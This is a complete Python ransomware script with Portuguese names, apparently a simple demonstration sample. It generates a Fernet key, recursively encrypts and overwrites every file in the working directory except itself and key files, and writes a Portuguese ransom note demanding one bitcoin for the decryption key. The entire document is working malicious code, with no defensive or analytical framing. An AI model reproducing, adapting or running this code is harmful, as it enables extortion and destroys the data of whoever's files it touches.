from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz,nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Enviar 1 bitcoin para o enderço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para recuperar seus dados!\n")

def main():
    gerar_chave()
    chave = carregar_chave()
    diretorio = os.getcwd()
    arquivos = encontrar_arquivos(diretorio)
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        criar_mensagem_resgate()
        print("Ransomware executado! Arquivos criptografados!")

if __name__ == '__main__':
    main()
